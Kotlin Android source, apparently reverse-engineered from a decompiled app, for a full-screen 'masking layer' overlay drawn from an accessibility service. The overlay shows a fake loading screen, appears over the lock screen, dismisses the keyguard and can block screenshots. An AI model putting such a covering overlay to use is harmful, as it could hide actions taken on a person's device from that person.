package com.storm.safe.rock.service.modules.overlay

import android.accessibilityservice.AccessibilityService
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Rect
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView

/**
 * Builds and manages the WindowManager overlay view.
 * Reverse-engineered from JADX: C0708j7.java (MaskOverlay, 320 lines).
 */
class OverlayWindowView(
    private val service: AccessibilityService,
    private val config: OverlayConfig
) {
    companion object {
        private const val TAG = "OverlayWindowView"
        private const val MAX_RETRIES = 5
        private const val MAX_RETRY_DELAY_MS = 3000L
    }

    var progressBarView: View? = null
        private set
    var tipTextView: TextView? = null
        private set
    private var windowManager: WindowManager? = null
    var rootView: FrameLayout? = null
        private set
    private var bgImageView: ImageView? = null
    @Volatile
    var isAttached: Boolean = false
        private set
    private var retryCount: Int = 0
    private val mainHandler = Handler(Looper.getMainLooper())

    fun attach() {
        if (isAttached) return
        if (windowManager == null) {
            windowManager = service.getSystemService("window") as? WindowManager
        }
        try {
            rootView = buildView()
            val params = buildLayoutParams()
            windowManager?.addView(rootView, params)
            isAttached = true
            retryCount = 0
            Log.d(TAG, "✅ 遮挡层已显示")
        } catch (e: Exception) {
            retryCount++
            if (retryCount > MAX_RETRIES) {
                Log.e(TAG, "❌ 遮挡层显示失败，已重试${MAX_RETRIES}次")
                rootView = null
                return
            }
            val delay = ((1L shl retryCount) * 200).coerceAtMost(MAX_RETRY_DELAY_MS)
            Log.w(TAG, "⚠️ addView失败(第${retryCount}次), ${delay}ms后重试")
            rootView = null
            mainHandler.postDelayed({ attach() }, delay)
        }
    }

    fun detach() {
        if (!isAttached) return
        try {
            bgImageView?.setImageDrawable(null)
            rootView?.background = null
            windowManager?.removeView(rootView)
        } catch (e: Exception) {
            Log.w(TAG, "removeView 异常: ${e.message}")
        }
        rootView = null
        progressBarView = null
        tipTextView = null
        bgImageView = null
        isAttached = false
    }

    fun updateFlags(newConfig: OverlayConfig) {
        val rv = rootView ?: return
        if (!isAttached) return
        try {
            val params = buildLayoutParams(newConfig)
            windowManager?.updateViewLayout(rv, params)
        } catch (e: Exception) {
            Log.w(TAG, "updateViewLayout 异常: ${e.message}")
        }
    }

    fun getContainerWidth(): Int {
        val bar = progressBarView ?: return 0
        val container = bar.parent as? FrameLayout ?: return 0
        val w = container.width
        if (w > 0) return w
        val (screenW, _) = getRealScreenSize()
        return (screenW * 0.65f).toInt()
    }

    // Build the full view hierarchy with:
    // - Background layer (Image or SolidColor from config)
    // - Center: app icon (80dp, rounded 16dp), app name (18sp), progress bar (65% width, gradient), tip text (14sp)
    // - Bottom: titleText (16sp), subtitleText (12sp), statusText (12sp #AAAAAA)
    // systemUiVisibility = 5894 (full immersive)
    private fun buildView(): FrameLayout {
        val density = service.resources.displayMetrics.density
        val (screenWidth, _) = getRealScreenSize()

        val root = FrameLayout(service)
        root.setBackgroundColor(Color.BLACK)
        @Suppress("DEPRECATION")
        root.systemUiVisibility = 5894

        // Background layer
        val bgImage = ImageView(service)
        bgImage.layoutParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
        )
        bgImage.scaleType = ImageView.ScaleType.CENTER_CROP
        loadBackground(bgImage)
        bgImageView = bgImage
        root.addView(bgImage)

        // Center content
        val center = LinearLayout(service)
        center.orientation = LinearLayout.VERTICAL
        center.gravity = Gravity.CENTER
        val centerParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT
        )
        centerParams.gravity = Gravity.CENTER
        center.layoutParams = centerParams

        if (config.showAppIcon) {
            try {
                val icon = ImageView(service)
                val iconSize = (80 * density).toInt()
                val iconParams = LinearLayout.LayoutParams(iconSize, iconSize)
                iconParams.gravity = Gravity.CENTER_HORIZONTAL
                iconParams.bottomMargin = (12 * density).toInt()
                icon.layoutParams = iconParams
                icon.scaleType = ImageView.ScaleType.FIT_CENTER
                icon.clipToOutline = true
                val cornerRadius = 16 * density
                icon.outlineProvider = RoundedOutlineProvider(cornerRadius)
                icon.setImageDrawable(service.packageManager.getApplicationIcon(service.packageName))
                center.addView(icon)

                val appName = service.packageManager.getApplicationLabel(
                    service.packageManager.getApplicationInfo(service.packageName, 0)
                ).toString()
                if (appName.isNotEmpty()) {
                    val nameView = TextView(service)
                    nameView.text = appName
                    nameView.textSize = 18f
                    nameView.setTextColor(Color.WHITE)
                    nameView.gravity = Gravity.CENTER
                    val nameParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                    nameParams.gravity = Gravity.CENTER_HORIZONTAL
                    nameParams.bottomMargin = (28 * density).toInt()
                    nameView.layoutParams = nameParams
                    center.addView(nameView)
                }
            } catch (e: Exception) {
                Log.w(TAG, "加载应用图标失败: ${e.message}")
            }
        }

        when (val style = config.progressBar) {
            is OverlayConfig.ProgressBarStyle.None -> {}
            is OverlayConfig.ProgressBarStyle.GradientBlue -> {
                buildProgressBar(center, density, screenWidth, style.startColor, style.endColor)
            }
            is OverlayConfig.ProgressBarStyle.SystemOrange -> {
                buildProgressBar(center, density, screenWidth, style.color, style.color)
            }
        }

        if (config.loadingTips.isNotEmpty()) {
            val tipView = TextView(service)
            tipView.text = config.loadingTips[0]
            tipView.textSize = 14f
            try { tipView.setTextColor(Color.parseColor(config.titleColor)) }
            catch (_: Exception) { tipView.setTextColor(Color.WHITE) }
            tipView.gravity = Gravity.CENTER
            val tipParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            )
            tipParams.gravity = Gravity.CENTER_HORIZONTAL
            tipView.layoutParams = tipParams
            tipTextView = tipView
            center.addView(tipView)
        }

        root.addView(center)

        if (config.titleText.isNotEmpty() || config.subtitleText.isNotEmpty()) {
            val bottom = LinearLayout(service)
            bottom.orientation = LinearLayout.VERTICAL
            bottom.gravity = Gravity.CENTER
            val bottomParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT
            )
            bottomParams.gravity = Gravity.BOTTOM
            bottomParams.bottomMargin = (60 * density).toInt()
            bottom.layoutParams = bottomParams

            if (config.titleText.isNotEmpty()) {
                val titleView = TextView(service)
                titleView.text = config.titleText.trim()
                titleView.textSize = 16f
                try { titleView.setTextColor(Color.parseColor(config.titleColor)) }
                catch (_: Exception) { titleView.setTextColor(Color.WHITE) }
                titleView.gravity = Gravity.CENTER
                bottom.addView(titleView)
            }
            if (config.subtitleText.isNotEmpty()) {
                val subView = TextView(service)
                subView.text = config.subtitleText.replace("\\n", "\n")
                subView.textSize = 12f
                try { subView.setTextColor(Color.parseColor(config.subtitleColor)) }
                catch (_: Exception) { subView.setTextColor(Color.parseColor("#CCCCCC")) }
                subView.gravity = Gravity.CENTER
                val subParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
                )
                subParams.topMargin = (8 * density).toInt()
                subView.layoutParams = subParams
                bottom.addView(subView)
            }
            if (config.statusText.isNotEmpty()) {
                val statusView = TextView(service)
                statusView.text = config.statusText
                statusView.textSize = 12f
                statusView.setTextColor(Color.parseColor("#AAAAAA"))
                statusView.gravity = Gravity.CENTER
                val statusParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
                )
                statusParams.topMargin = (8 * density).toInt()
                statusView.layoutParams = statusParams
                bottom.addView(statusView)
            }
            root.addView(bottom)
        }

        return root
    }

    private fun buildProgressBar(
        parent: LinearLayout, density: Float, screenWidth: Int,
        startColor: Int, endColor: Int
    ) {
        val barWidth = (screenWidth * 0.65f).toInt()
        val barHeight = (6 * density).toInt()
        val container = FrameLayout(service)
        val containerParams = LinearLayout.LayoutParams(barWidth, barHeight)
        containerParams.gravity = Gravity.CENTER_HORIZONTAL
        containerParams.bottomMargin = (16 * density).toInt()
        container.layoutParams = containerParams

        val track = View(service)
        val trackBg = GradientDrawable()
        trackBg.setColor(0x33FFFFFF)
        trackBg.cornerRadius = 2 * density
        track.background = trackBg
        track.layoutParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
        )
        container.addView(track)

        val progress = View(service)
        val progressBg = GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT, intArrayOf(startColor, endColor)
        )
        progressBg.cornerRadius = 2 * density
        progress.background = progressBg
        progress.layoutParams = FrameLayout.LayoutParams(0, FrameLayout.LayoutParams.MATCH_PARENT)
        progressBarView = progress
        container.addView(progress)

        parent.addView(container)
    }

    private fun loadBackground(imageView: ImageView) {
        when (val bg = config.background) {
            is OverlayConfig.OverlayBackground.SolidColor -> {
                imageView.setBackgroundColor(bg.color)
                imageView.alpha = bg.alpha
            }
            is OverlayConfig.OverlayBackground.Image -> {
                var loaded = false
                for (assetPath in bg.assetPaths) {
                    try {
                        val stream = service.assets.open(assetPath)
                        val bitmap = BitmapFactory.decodeStream(stream)
                        stream.close()
                        if (bitmap != null) { imageView.setImageBitmap(bitmap); loaded = true; break }
                    } catch (_: Exception) {}
                }
                if (!loaded && bg.fallbackDrawable != null) {
                    try {
                        val resId = service.resources.getIdentifier(bg.fallbackDrawable, "drawable", service.packageName)
                        if (resId != 0) { imageView.setImageResource(resId); loaded = true }
                    } catch (_: Exception) {}
                }
                if (!loaded) imageView.setBackgroundColor(bg.fallbackColor)
            }
        }
    }

    fun buildLayoutParams(overrideConfig: OverlayConfig? = null): WindowManager.LayoutParams {
        val cfg = overrideConfig ?: config
        val type = if (Build.VERSION.SDK_INT >= 26)
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
        if (cfg.keepScreenOn) {
            flags = flags or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        }
        flags = flags or WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        if (cfg.touchMode == OverlayConfig.TouchMode.PASSTHROUGH)
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        if (cfg.preventScreenshot)
            flags = flags or WindowManager.LayoutParams.FLAG_SECURE

        val (w, h) = getRealScreenSize()
        val params = WindowManager.LayoutParams(w, h, type, flags, android.graphics.PixelFormat.RGBA_8888)
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 0; params.y = 0
        if (Build.VERSION.SDK_INT >= 28) {
            params.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        return params
    }

    private fun getRealScreenSize(): Pair<Int, Int> {
        val wm = windowManager ?: service.getSystemService("window") as WindowManager
        return if (Build.VERSION.SDK_INT >= 30) {
            val bounds: Rect = wm.currentWindowMetrics.bounds
            Pair(bounds.width(), bounds.height())
        } else {
            val dm = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm)
            Pair(dm.widthPixels, dm.heightPixels)
        }
    }

    private class RoundedOutlineProvider(private val radius: Float) :
        android.view.ViewOutlineProvider() {
        override fun getOutline(view: View, outline: android.graphics.Outline) {
            outline.setRoundRect(0, 0, view.width, view.height, radius)
        }
    }
}
